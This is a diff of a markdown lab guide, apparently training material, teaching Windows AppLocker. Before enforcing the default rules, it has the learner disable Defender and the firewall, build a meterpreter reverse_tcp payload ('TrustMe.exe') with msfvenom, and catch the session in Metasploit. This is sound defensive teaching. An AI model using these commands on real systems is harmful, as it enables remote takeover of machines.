@@ -18,102 +18,85 @@ Let’s see what happens when we do not have **AppLocker** running.  We will set
 
 Before we begin, we need to disable **Defender**. Start by opening an instance of **Windows Powershell**. Do this by clicking on the **Powershell** icon in the taskbar.
 
-<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/b51c10be-34d9-446a-be52-8ceb319815ac" />
+![](attachments/2026-05-11%2009_39_54-Calendar%20_%20Microsoft%20Teams.png)
 
-
-
-Next, run the following command in the **Powershell** terminal:
+Once it opens, run the following command in the **Powershell** terminal:
 
 ```ps
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
-![](attachments/applocker_disabledefender.png)
+![](attachments/defenderdisabled.png)
 
-This will disable **Defender** for this session.
+This will disable **Defender**.
 
 >[!Note]
 >
 >If you get angry red errors, that is **Ok**, it means **Defender** is not running.
 
+>[!WARNING]
+>
+>**Defender** has a habit of starting itself back up. <br>
+>We will run this command again later in the lab.
 
-Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
 
-<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/3d9509ba-9139-4304-8f52-6854fee2b43c" />
+Next, lets ensure the firewall is disabled. 
 
+Open up a Windows Command Prompt by **Double-Clicking** the icon on the desktop:
+
+![](attachments/opencommandprompt.png)
+
+Once open, run the following command:
 
 ```cmd
 netsh advfirewall set allprofiles state off
 ```
 
+![](attachments/firewalloff.png)
 
-Next, set a password for the Administrator account that you can remember
+<!--
+Next, set a password for the Administrator account that you can remember:
 
 ```cmd
 net user Administrator password1234
 ```
 
+
 >[!Note]
 >
 >That is a very bad password.  Come up with something better. But, please remember it.
 
+-->
 
+Next, open an **Ubuntu Shell** by **Double-clicking** the icon on the desktop:
 
-
-Next, open a **Linux Shell** with one of the following methods: 
-
-Method 1:
-
-1. **Double-click** `Ubuntu Shell` on Desktop
-
-<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />
+![](attachments/ubuntushell;.png)
 
 <br>
 
-Method 2:
 
-1. Open **Command Prompt**
-
-<img width="85" height="103" alt="image" src="https://github.com/user-attachments/assets/b2c7dbad-d57b-40d0-9318-ca8d40176c22" />
-
-2. **SSH** into the **Linux** machine
-```bash
-ssh ubuntu@linux.cloudlab.lan
-```
-
-<img width="247" height="25" alt="image" src="https://github.com/user-attachments/assets/69706053-abe6-4de7-aa48-d9fd739ec4a7" />
-
-
-
-
-
-##
-
-ONce our terminal is open, let's start by getting root access in our terminal.
-
-```bash
-sudo su -
-```
-
-Before we run the next commands, we need to get the **IP** of our **Linux System**. Lets do so by running the following:
+We need to get the **IP** of our **Linux System**. Lets do so by running the following:
 
 ```bash
 ifconfig
 ```
 
+We want to look for the **ens5** connection:
+
 <img width="716" height="175" alt="2026-02-23_10-33" src="https://github.com/user-attachments/assets/eb5b0547-6da5-4f35-8ce4-43580c8a97d7" />
 
 <br>
 
+Write this down to remember for later!
+
+
+
 >[!Note]
 >
->REMEMBER: YOUR IP WILL BE DIFFERENT**
+>**REMEMBER: YOUR IP WILL BE DIFFERENT**
 
 Now, run the following commands to start a simple backdoor and backdoor listener: 
 
->[!Tip]
->
->Feel free to open a second terminal/shell window to make this section easier!
 
 ```bash
 cd /tmp/
@@ -122,8 +105,15 @@ cd /tmp/
 ```bash
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > TrustMe.exe
 ```
+<br>
 
-Let's start the **Metasploit Handler**
+Let's start the **Metasploit Handler**. 
+
+First, lets open a second **Ubuntu Shell** by **Double-Clicking** the icon on the desktop:
+
+![](attachments/ubuntushell;.png)
+
+Then run the following command in the new window:
 
 ```bash
 msfconsole -q
@@ -133,7 +123,7 @@ msfconsole -q
 
 
 
-The **Metasploit Handler** successfully ran if the terminal now starts with **"msf6 >"**
+The **Metasploit Handler** successfully ran if the terminal now starts with **"msf >"**
 
 Next, let's run the following:
 
@@ -165,10 +155,11 @@ It should look like this:
 
 <img width="671" height="192" alt="2026-02-23_10-54" src="https://github.com/user-attachments/assets/4c40211d-7f95-48df-bff5-4a62c261d620" />
 
+<br>
 
-Let’s download the malware and run it!
+Now we need to download the malware and run it!
 
-Going back to our **Powershell** terminal, copy the file over from **Linux**
+Navigate back to your **Powershell** terminal, and then use the following command to copy the file over:
 
 ```ps
 cd .\Desktop\
@@ -177,18 +168,27 @@ cd .\Desktop\
 ```ps
 scp ubuntu@linux.cloudlab.lan:/tmp/TrustMe.exe .
 ```
+<br>
+You should see this:
 
-Open a **Windows** command prompt. 
+<br>
 
-<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/86cb26ca-748a-4d29-9d5b-cdc31d22ca3a" />
+![](attachments/copytrustme.png)
 
-Once the prompt is open, let's run the following commands to run the **"TrustMe.exe"** file.
+Great! We have the malware. 
+
+Now open up another Windows Command Prompt by **Double-Clicking** the icon on the desktop:
+
+![](attachments/opencommandprompt.png)
+
+
+Once the prompt is open, let's navigate to the **Desktop** directory:
 
 ```cmd
 cd \Users\Administrator\Desktop
 ```
  
-Then run it with the following:
+Then run the **"TrustMe.exe"** file with the following:
 
 ```cmd
 TrustMe.exe
@@ -196,17 +196,26 @@ TrustMe.exe
 
 <img width="407" height="85" alt="Screenshot From 2026-02-23 11-05-02" src="https://github.com/user-attachments/assets/d49eec4b-9798-4069-8728-2b5373fbd569" />
 
+<br>
 
-Back at your **Linux** terminal, you should now have a **metasploit** session!
+Head back to your **Ubuntu Shell**.
+
+You should now have a **metasploit** session!
 
 <img width="985" height="391" alt="2026-02-23_11-06" src="https://github.com/user-attachments/assets/1cc56b49-784c-4160-b042-7aacda9a5f75" />
 
+
+<br>
+
+This isn't good. The malware successfully ran and now has read, write, and **execute** permissions!
 
 Let’s stop this from happening!
 
 To do this we will need to access the **"Local Security Policy"** on your **Windows** System.
 
-Simply press the Windows key, (lower left hand of your keyboard, looks like a Windows Logo), then type **"Local Security"**.  It should bring up a menu like the one below, please select **"Local Security Policy"**.
+Start by typing **"Local Security Policy"** in the taskbar search field.
+
+It should bring up a menu like the one below, please select **"Local Security Policy"**.
 
 ![](attachments/localsecuritypolicy.png)
 
@@ -214,11 +223,13 @@ We will need to configure **AppLocker**.  To do this, please go to Security Sett
 
 ![](attachments/localsecpolicywindow.png)
 
-Scroll down in the right hand pane. You will see there are **"0 Rules enforced"** for all policies.  We will add in the default rules.  We will choose the defaults because we are far less likely to break a system.
+Scroll down in the right hand pane. You will see there are **"0 Rules enforced"** for all policies.  We will add in the default rules.  
+
+We will choose the defaults because we are far less likely to break a system that way.
 
 ![](attachments/rulesoverview.png)
 
-Please select each of the above Rule groups, **"Executable, Windows Installer, Script, and Packaged,"** and for each one, right click in the area that says **“There are no items to show in this view.”** and then select **“Create Default Rules”**.
+Please select *each* of the above Rule groups, **"Executable, Windows Installer, Script, and Packaged,"** and for each one, right click in the area that says **“There are no items to show in this view.”** and then select **“Create Default Rules”**.
 
 ![](attachments/createdefaultrules.png)
 
@@ -226,30 +237,49 @@ This should generate a subset of rules for each group.  It should look similar t
 
 ![](attachments/appliedrules.png)
 
-For simplicity, you can click the next set of rules from the left panel as seen above.
+>[!Tip]
+>
+>For simplicity, you can click the next set of rules from the left panel as seen above.
 
-We now need to enforce the rules:
+Next, we need to enforce these "new" rules.
 
 To do this you will need to select **AppLocker** on the far left pane.  You will need to select **"Configure rule enforcement"**.  This will open a pop-up. Check the **"Configured"** box for each set of rules.  
 
 ![](attachments/ruleenforcement.png)
 
-We will need to start the **"Application Identity service"**.  This is done through this **cmd** command, open **Command Prompt**:
+When finished, click **APPLY** at the bottom of the window.
 
-<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/50e871b5-a3ec-4c55-92dd-db5fd4a1e1d4" />
+>[!NOTE]
+>
+>If you cannot see the **Apply** button due to window sizing- just hit **Enter** after checking the boxes! 
+>
+>Double-check by clicking "Configure rule enforcement" and make sure they stayed checked!
+
+<br>
+
+Now we need to start the **"Application Identity service"**.  
+
+Let's type **"Services"** in the taskbar search box. Once you see this menu, select the following:
+
+![](attachments/servicessearch.png)
+
+This will bring up the **Services App**. Double-click **"Application Identity"**.
+
+![](attachments/applicationidentity.png)
+
+Once the **"Application Identity Properties"** dialogue is open, please press the **Start** button. This will start the service.
+
+![](attachments/startservice.png)
 
 
-```cmd
-powershell sc start AppIDSvc
-```
-
-
-Run **"gpupdate"** to force the policy change.
+Now, open up your command prompt, and run **"gpupdate"** to force the policy change.
 
 
 ```bash
 gpupdate /force
 ```
+
+![](attachments/gpupdate.png)
 
 We are now going to try to run **"TrustMe.exe"** as another user on the system. 
 
